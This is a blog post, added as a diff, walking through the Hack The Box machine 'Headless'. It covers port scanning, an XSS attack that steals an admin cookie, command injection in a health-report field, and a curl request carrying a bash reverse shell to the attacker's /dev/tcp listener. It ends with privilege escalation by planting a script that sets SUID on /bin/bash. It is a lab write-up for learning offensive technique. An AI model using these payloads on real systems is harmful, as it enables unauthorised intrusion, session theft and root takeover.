@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html id="doc" class="">
+<div id="particles-js">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!--  Essential META Tags -->
+<meta property="og:title" content="Headless HTB Writeup">
+<meta name="description" content="Headless HTB Writeup | 0xv01d">
+<meta property="og:type" content="article" />
+<meta property="og:image" content="/images/HTB/headless/headless_card.png">
+<meta property="og:url" content="https://0xv01d.github.io/hackthebox/headless">
+<meta name="twitter:card" content="/images/HTB/headless/headless_card.png">
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/Scripts/js/particles.js"></script>
+    <script src="/Scripts/js/app.js"></script>
+    <title>Headless HTB Writeup | 0xv01d</title>
+    <meta property="og:locale" content="en_US">
+    <script type="application/ld+json">
+    </script>
+
+  <link rel="stylesheet" href="/Styles/style.css?v=">
+	<link rel="stylesheet" href="/Styles/highlight_monokai.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+    <!-- Bootstrap CSS -->
+    <!--<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"/>-->
+	<link rel="stylesheet" href="/Styles/style_darkwing.css">
+	<link rel="stylesheet" href="/Styles/footer.css">
+  <script src="/Scripts/js/bar.js"></script>
+
+
+<!-- Setup Google Analytics -->
+
+	<link rel="shortcut icon" type="image/x-icon" href="/images/HTB/headless/favicon.ico">
+
+<!--Information Sidebar-->
+
+  </head>
+  <body>
+
+
+        <aside id="menu" class="hide">
+            <div class="inner flex-row-vertical">
+                <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+                    <i class="icon icon-lg icon-times-circle"></i>
+                    <!--        <i class="icon icon-lg icon-close"></i>-->
+                </a>
+                <div class="brand-wrap avatar-wrapper">
+                    <!--    <div class="brand-wrap avatar-wrapper" style="background-image:url(/images/index/avatar.png);"> -->
+                    <a href="https:0xv01d.github.io">
+                        <img class="avatar shake" src="/images/index/avatar.png">
+
+                    </a>
+                    <p></p>
+                    <h1 class="tubelight"><strong>0xv01d</strong></h1>
+                </div>
+
+                <div class="scroll-wrap flex-col">
+                    <ul class="nav">
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="/">
+                                <i class="icon icon-lg icon-home"></i>
+                                Home
+                            </a>
+                        </li>
+<!--
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="#">
+                                <i class="icon icon-lg icon-archives"></i>
+                                Archives
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="#">
+                                <i class="icon icon-lg icon-tags"></i>
+                                Tags
+                            </a>
+                        </li>
+-->
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="https://github.com/0xv01d" target="_blank">
+                                <i class="icon icon-lg icon-github"></i>
+                                Github
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="https://infosec-0xv01d.medium.com/" target="_blank">
+                                <i class="icon_new fa-brands fa-medium"></i>
+                                <!--                <i class="icon icon-lg icon-medium"></i>-->
+                                Medium
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="https://www.youtube.com/@0xv01d_infosec" target="_blank">
+                                <i class="icon_new fa-brands fa-youtube"></i>
+                                Youtube
+                            </a>
+                        </li>
+                        
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="#" target="_blank">
+                                <i class="icon_new fa-brands fa-twitch"></i>
+                                Twitch
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="https://www.linkedin.com/in/isaac-david-g-7bb187318?utm_source=share&utm_campaign=share_via&utm_content=profile&utm_medium=android_app" target="_blank">
+                                <i class="icon_new fa-brands fa-linkedin"></i>
+                                Linkedin
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="/about">
+                                <i class="icon icon-lg icon-link"></i>
+                                About
+                            </a>
+                        </li>
+                    </ul>
+                    <a style="padding-left: 0.7rem; padding-top: 3rem;"
+                        href="https://app.hackthebox.com/profile/1120840" rel="noreferrer noopener" target="_blank">
+                        <img src="http://www.hackthebox.eu/badge/image/1120840" alt="Hack The Box">
+                    </a>
+                </div>
+            </div>
+        </aside>
+      <main id="main">
+<!--        class="app-container"> -->
+<div class="fixed-top" id="message"></div>
+      <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle" style="padding-right: 0.4rem;">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis" style="visibility: visible;">Headless - HackTheBox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="fa-solid fa-language"></i>
+<!--                <i class="icon icon-lg icon-language"></i>-->
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+
+      </header>
+      
+  <div class="container body-wrap">
+
+		<article class="post">		
+			<header class="post-header">
+
+	
+<!--Machine Title-->
+			<div class="title">Headless Walkthrough</div>			
+<!--Skill Tags-->								
+			<div class="tag-skills">
+				<svg class="icon icon-tag svg-tag" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+					<title>tag</title>
+					<path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" x2="7.01" y1="7" y2="7"></line>
+				</svg>
+				<a class="tag" href="#">Werkzeug</a>
+				<a class="tag" href="#">XSS</a>
+				<a class="tag" href="#">Cookie-Steal</a>
+				<a class="tag" href="#">Command Injection</a>
+				<a class="tag" href="#">Bash-Injection</a>
+			</div>
+
+			</header>
+
+<!--Machine Card-->			
+			<div><img class="machine-card" style="max-width:700px;" src="/images/HTB/headless/headless_card.png"></img></div>
+			
+<!--Machine Overview-->
+			<div class="subtitle">Headless Overview</div>
+			<p class="paragraph"><a href="https://app.hackthebox.com/machines/Headless" rel="noreferrer noopener" target="_blank">Headless</a> Headless is a machine on Hack The Box,
+                 submitted by <a href="https://app.hackthebox.com/users/1422414" rel="noreferrer noopener" target="_blank">dvir1</a>. The machine starts with a basic port scan that reveals SSH and a web service running on port 5000. Through web enumeration, we discover a support form 
+                vulnerable to cross-site scripting (XSS). By exploiting this vulnerability, we steal an admin cookie to gain access to the admin dashboard. Further exploration reveals a command
+                 injection vulnerability in the website health report feature, allowing us to execute a reverse shell and gain initial access to the system. Privilege escalation is achieved
+                  by exploiting a vulnerable syscheck script that we can run as sudo without a password. By replacing the script we gain root privileges and complete the machine.
+
+<!--Machine Resolution-->
+
+<h1 id="reconnaissance" class="toc-add toc-title">Reconnaissance</h1>
+<h2 id="Full-Port-Scan-With-Nmap" class="toc-add">Full Port Scan With Nmap</h2>
+
+  	        <p class="head-img">Starting with a basic port scan we can find two ports open ssh and something running in port 5000, let's enumerate the services running under those ports.</p>
+            <div class="language-plaintext highlighter-rouge"><div class="highlight">
+            <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> sudo </span>nmap -p- -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.11.8
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.95 ( https://nmap.org ) at 2024-07-19 20:11 CST
+Initiating SYN Stealth Scan at 20:11
+Scanning 10.10.11.8 [65535 ports]
+Discovered open port 22/tcp on 10.10.11.8
+Increasing send delay for 10.10.11.8 from 0 to 5 due to 514 out of 1712 dropped probes since last increase.
+Increasing send delay for 10.10.11.8 from 5 to 10 due to max_successful_tryno increase to 4
+Discovered open port 5000/tcp on 10.10.11.8
+Completed SYN Stealth Scan at 20:11, 16.67s elapsed (65535 total ports)
+Nmap scan report for 10.10.11.8
+Host is up, received user-set (0.47s latency).
+Scanned at 2024-07-19 20:11:00 CST for 17s
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack ttl 63
+5000/tcp open  upnp    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 16.86 seconds
+           Raw packets sent: 77817 (3.424MB) | Rcvd: 76879 (3.075MB)
+</span>	</code></pre></div></div>
+
+
+
+  	          <p class="head-img">After enumerate the service and version with nmap we can parse the xml to html with xsltproc so we can read it cleaner in the browser</p>
+                <div class="language-plaintext highlighter-rouge"><div class="highlight">
+                    <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"> <span class="kt">sudo</span> <span class="kt">nmap</span> -p22,5000 -sCV -vvv -n -Pn 10.10.11.8 -oX targetedXML
+[..SNIP..]
+
+<span class="na">❯</span><span class="kt"> xsltproc </span>targetedXML <span class="k">></span> index.html
+
+<span class="na">❯</span><span class="kt"> python3 </span>-m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</span>	</code></pre></div></div>
+
+			<p class="head-img">So we have SSH running on debian and also we have Werkzeug running on port 5000, let's enumerate the web technologies</p>
+			<img class="img-post" style="max-width: 1350px;" src="/images/HTB/headless/nmap_web_report.png"></img>
+
+<h2 id="Enumerating_Web_Technologies" class="toc-add">Enumerating Web Technologies</h2>
+
+			<p class="head-img">Well pretty much the same, but there's a cookie named "is_admin", we can check it out later, let's enumerate some directories before taking a look a the web.</p>
+		<div class="language-plaintext highlighter-rouge"><div class="highlight">
+            <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> whatweb </span>10.10.11.8:5000
+<span class="x">10.10.11.8:5000</span> [200 OK] Cookies[is_admin], Country[RESERVED][<span class="r">ZZ</span>], HTML5, HTTPServer[<span class="kt">Werkzeug/2.2.2 Python/3.11.2</span>], IP[10.10.11.8], Python[<span class="kt">3.11.12</span>], Script, Title[<span class="k">Under Construction</span>], Werkzeug[<span class="kt">2.2.2.2</span>]
+</span>	</code></pre></div></div>
+
+<h2 id="Directory_Enumeration" class="toc-add">Directory Enumeration</h2>
+
+			<p class="head-img">There's only two, we have dashboard wich is unauthorized and support, probably we should grab or forge another 'is_admin' cookie let's take a look at the web.</p>
+		<div class="language-plaintext highlighter-rouge"><div class="highlight">
+            <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> dirsearch </span>-t 200 -r -F -x 404,503 -u "http://10.10.11.8:5000/" 
+<span class="m">
+ _|. _ _  _  _  _ _|_    v0.4.3
+(_||| _) (/_(_|| (_| )</span>
+
+<span class="k">Extensions:</span> <span class="kt">php, aspx, jsp, html, js</span> <span class="m">|</span> <span class="k">HTTP method:</span> <span class="kt">GET</span> <span class="m">|</span> <span class="k">Threads:</span> <span class="kt">200</span> <span class="m">|</span> <span class="k">Wordlist size:</span> <span class="kt">11723</span>
+
+Output: /home/0xv01d/CTF/HTB/Machines/Headless/reports/http_10.10.11.8_5000/__24-07-19_20-52-41.txt
+
+<span class="k">Target:</span> <span class="kt">http://10.10.11.8:5000/</span>
+<span class="k">
+[20:52:41] Starting: 
+[20:54:24] 401 -  317B  - /dashboard</span><span class="kt">
+[20:56:24] 200 -    2KB - /support</span>
+
+<span class="k">Task Completed</span>
+</span> </code></pre></div></div>
+
+            <h1 id="foothold" class="toc-add toc-title" style="padding-top: 2.5rem;">Foothold</h1>
+
+            <h2 id="Support-Form" class="toc-add">Support Form</h2>
+			<p class="head-img">Well once on the web there's nothing but a support form, also wapalyzer could'n detect any technology, let's start to test some stuff in the form</p>
+			<img class="img-post" style="max-width: 1349px;" src="/images/HTB/headless/support_wapalyzer.png"></img>
+
+            <h2 id="Hacking-Alert" class="toc-add">Hacking Alert</h2>
+			<p class="head-img">After trying some basic injections a hacking alert is triggered, but as the alert states, a report with the headers it's going to be sent to the administrator anyways, let's test some alternatives</p>
+			<img class="img-post" style="max-width: 532px;" src="/images/HTB/headless/hacking_attempt.png"></img>
+
+            <h2 id="XSS-Cookie-Stealer" class="toc-add">XSS Cookie Stealer</h2>
+			<p class="head-img">Doing some tests in burp i manage to make it work, assuming that the data is going to be reviewed we can use a data-graber <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber-for-xss" rel="noreferrer noopener" target="_blank">payload</a> so we can try to steal some cookie, we need to set the payload in the message parameter as in some header, i'll place it in the User-Agent.</p>
+			<img class="img-post" style="max-width: 1352px;" src="/images/HTB/headless/burpsuite_xss.png"></img>
+            
+            <p class="head-img">After a few seconds of sending the payload i get a hit on my server</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+            <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">python3</span> -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.8 - - [19/Jul/2024 22:58:28] "GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 200 -
+</span> </code></pre></div></div>
+
+			<p class="head-img">Now let's change the cookie</p>
+			<img class="img-post" style="max-width: 501px;" src="/images/HTB/headless/change_cookie.png"></img>
+
+            <h2 id="Dashboard-Admin-Access" class="toc-add">Dashboard - Admin Access</h2>
+			<p class="head-img">And voilà, we're able to nagivate to the Admin dashboard, well seems like we can generate a website health report, let's pass it through burp to see how the data is parsed </p>
+			<img class="img-post" style="max-width: 1350px;" src="/images/HTB/headless/admin_dashboard.png"></img>
+
+            <h2 id="Dashboard-Admin-Access" class="toc-add">Command Injection On Health Report Feature</h2>
+			<p class="head-img">Well the date it's just passed as shown, i tried to append a chaining command and seems work, it is vulnerable to command injection, let's try to send us a reverse shell</p>
+			<img class="img-post" style="max-width: 1350px;" src="/images/HTB/headless/burpsuite_command_injection_test.png"></img>
+
+            <h1 id="Initial-Access" class="toc-add toc-title" style="padding-top: 2.5rem;">Initial Access</h1>
+            <h2 id="Reverse-Shell-Set-Up" class="toc-add">Reverse Shell Set Up</h2>
+            <p class="head-img">Let's send the payload</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+            <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">curl</span> --path-as-is -i -s -k -X <span class="k">$'POST'</span> -H <span class="k">$'Host: 10.10.11.8:5000'</span> -H <span class="k">$'Referer: http://10.10.11.8:5000/dashboard'</span> -b <span class="k">$'is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0'</span> --data-binary <span class="k">$'date=2023-09-15+%26%26+bash+-c+<span class="kt">\'</span>bash+-i+>%26+/dev/tcp/10.10.16.58/9001+0>%261<span class="kt">\'</span>' 'http://10.10.11.8:5000/dashboard'</span> & disown
+</span> </code></pre></div></div>
+
+            <p class="head-img">And catch the shell, let's <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" rel="noreferrer noopener" target="_blank">upgrade it</a> so we can move freely.</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+            <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">nc</span> -nlvp 9001
+Connection from 10.10.11.8:33756
+bash: cannot set terminal process group (1380): Inappropriate ioctl for device
+bash: no job control in this shell
+dvir@headless:~/app$ 
+</span> </code></pre></div></div>
+
+            <h1 id="Privilege-Escalation" class="toc-add toc-title" style="padding-top: 2.5rem;">Privilege Escalation</h1>
+            <h2 id="Reverse-Shell-Set-Up" class="toc-add">Checking Sudoers Privileges</h2>
+            <p class="head-img">Checking the sudoers privileges we can run syscheck as sudo without password</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+            <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
+<span class="ld"><span class="kt">dvir@headless:~/app$</span> sudo -l
+Matching Defaults entries for dvir on headless:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User dvir may run the following commands on headless:
+    (ALL) NOPASSWD: /usr/bin/syscheck
+
+<span class="kt">dvir@headless:~/app$</span>
+</span> </code></pre></div></div>
+
+            <h2 id="Analyzing-Syscheck-Script" class="toc-add">Analyzing Syscheck Script</h2>
+            <p class="head-img">Taking a look at the script we can see it performs some system checks but also executes the initdb.sh thats in the working directory './initdb.sh', we can replace it with a custom one that assigns suid privileges to bash</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+            <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
+<span class="ld"><span class="kt">dvir@headless:~/app$</span> cat /usr/bin/syscheck 
+#!/bin/bash
+
+if [ "$EUID" -ne 0 ]; then
+  exit 1
+fi
+
+last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
+formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
+/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
+
+disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
+/usr/bin/echo "Available disk space: $disk_space"
+
+load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
+/usr/bin/echo "System load average: $load_average"
+
+if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+  /usr/bin/echo "Database service is not running. Starting it..."
+  ./initdb.sh 2>/dev/null
+else
+  /usr/bin/echo "Database service is running."
+fi
+
+exit 0
+
+<span class="kt">dvir@headless:~/app$</span>
+</span> </code></pre></div></div>
+
+<h2 id="Exploiting-Bash-Injection-Vulneravility" class="toc-add">Exploiting Bash Injection Vulneravility</h2>
+<p class="head-img">After running the script we can spawn a privilege shell, and thats it.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight">
+    <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
+<span class="ld"><span class="kt">dvir@headless:~/app$</span> echo -e '#/bin/bash\n\n chmod u+s /bin/bash' > ./initdb.sh
+
+<span class="kt">dvir@headless:~/app$</span> chmod +x ./initdb.sh 
+
+<span class="kt">dvir@headless:~/app$</span> sudo /usr/bin/syscheck
+Last Kernel Modification Time: 01/02/2024 10:05
+Available disk space: 1.6G
+System load average:  0.04, 0.08, 0.02
+Database service is not running. Starting it...
+
+<span class="kt">dvir@headless:~/app$</span> bash -p
+bash-5.2# whoami
+root
+
+bash-5.2# id
+uid=1000(dvir) gid=1000(dvir) euid=0(root) groups=1000(dvir),100(users)
+
+bash-5.2# 
+</span> </code></pre></div></div>
+
+		</article>
+
+<aside class="post-widget">
+   <nav class="post-toc-wrap fixed" id="post-toc">
+      <h4>Table of contents</h4>
+      <ol class="post-toc">
+      </ol>
+   </nav>
+</aside>
+
+
+<a href="https://www.buymeacoffee.com/0xv01d" target="_blank" style="margin-top: 1rem;"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
+
+    </div>
+<article id="wrap">
+	<article id="lightings">
+    	<section id="one">
+            <section id="two">
+                <section id="three">
+                    <section id="four">
+                        <section id="five">
+                            
+                        </section>
+                    </section>
+                </section>
+            </section>
+		</section>
+    </article>
+</article>
+
+    <footer class="footer">
+    <div class="bottom">
+        <p><span>0xv01d © 2022 - 2024</span>
+        </p>
+    </div>
+</footer> 
+      </main>
+      <div id="mask" class="mask"></div>
+<a href="#" id="gotop" class="waves-effect waves-circle waves-light in"><span class="icon icon-lg icon-chevron-up"></span></a>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            var gotopButton = document.getElementById("gotop");
+
+            // Show/hide the button based on scroll position
+            window.addEventListener("scroll", function () {
+                if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                    gotopButton.style.opacity = "1";
+                } else {
+                    gotopButton.style.opacity = "0";
+                }
+            });
+
+            // Smooth scroll to top when the button is clicked
+            gotopButton.addEventListener("click", function (event) {
+                event.preventDefault();
+
+                // Use the scrollIntoView method with behavior: 'smooth'
+                document.body.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            });
+        });
+
+    </script>
+    <script>
+        function copyToClipboard(button) {
+            // Find the nearest .highlight parent of the clicked button
+            const codeElement = button.closest('.highlight');
+
+            if (codeElement) {
+                // Clone the code element to exclude the button
+                const codeClone = codeElement.cloneNode(true);
+
+                // Remove the button from the clone
+                const buttons = codeClone.querySelectorAll('.copy-btn');
+                buttons.forEach((btn) => btn.remove());
+
+                const codeText = codeClone.innerText;
+
+                // Create a temporary textarea element to copy the text
+                const textarea = document.createElement('textarea');
+                textarea.value = codeText;
+                document.body.appendChild(textarea);
+
+                // Select and copy the text
+                textarea.select();
+                document.execCommand('copy');
+
+                // Remove the temporary textarea
+                document.body.removeChild(textarea);
+
+                // Change the icon in the button to "fa-check"
+                const iconElement = button.querySelector('i');
+                if (iconElement) {
+                  iconElement.classList.remove('fa-clipboard');
+                  iconElement.classList.add('fa-check', 'green-icon');
+                }
+
+                // Temporarily change the icon back to "fa-clipboard" after 2000 milliseconds (2 seconds)
+                setTimeout(() => {
+                  if (iconElement) {
+                    iconElement.classList.remove('fa-check', 'green-icon');
+                    iconElement.classList.add('fa-clipboard');
+                  }
+                }, 2000);
+            } else {
+                console.error('Unable to find the code element');
+            }
+        }
+    </script>
+
+
+    <script>
+    document.getElementById('menu-toggle').addEventListener('click', function() {
+        var menu = document.getElementById('menu');
+        // Toggle: Si tiene la clase 'hide', la quita; si no la tiene, la agrega
+        menu.classList.toggle('hide');
+    });
+
+    document.getElementById('menu-off').addEventListener('click', function() {
+        var menu = document.getElementById('menu');
+        // Agregar la clase 'hide' para ocultar el menú
+        menu.classList.add('hide');
+    });
+</script>
+
+<script>
+    function lock() {
+        var doc = document.getElementById('doc');
+        var menu = document.getElementById('menu');
+        var mask = document.getElementById('mask');
+        var screenWidth = window.innerWidth;
+
+        if (screenWidth <= 1240) {
+            doc.classList.toggle('lock');  // Toggle: Si tiene la clase 'hide', la quita; si no la tiene, la agrega
+            menu.classList.remove('hide')
+            menu.classList.toggle('show')
+            mask.classList.add('in')
+        } else {
+            doc.classList.remove('lock');      // Agregar la clase 'hide' para ocultar el menú
+        }
+    }
+
+    function unlock() {
+        var doc = document.getElementById('doc');
+        var menu = document.getElementById('menu');
+        var mask = document.getElementById('mask');
+        var screenWidth = window.innerWidth;
+
+        if (screenWidth <= 1240) {
+            doc.classList.remove('lock');  // Toggle: Si tiene la clase 'hide', la quita; si no la tiene, la agrega
+            menu.classList.toggle('hide')
+            menu.classList.remove('show')
+            mask.classList.remove('in')
+        } else {
+            doc.classList.remove('lock');      // Agregar la clase 'hide' para ocultar el menú
+            menu.classList.add('hide')
+            menu.classList.remove('show')
+            mask.classList.remove('in')
+        }
+    }
+
+    // Llamar a la función al cargar la página y cuando se redimensiona la ventana
+//    window.addEventListener('load', lock);
+//    window.addEventListener('resize', unlock);
+
+    // Añadir el evento click al botón de menú
+    document.getElementById('menu-toggle').addEventListener('click', function() {
+        lock();  // Actualizar visibilidad del menú al hacer clic en el botón
+    });
+
+    // Añadir el evento click al botón de ocultar menú
+    document.getElementById('menu-off').addEventListener('click', function() {
+        unlock();  // Actualizar visibilidad del menú al hacer clic en el botón de ocultar
+    });
+    
+    document.getElementById('mask').addEventListener('click', function() {
+        unlock();  // Actualizar visibilidad del menú al hacer clic en el botón de ocultar
+    });
+</script>
+
+
+  </body>
+</div>
+</html>
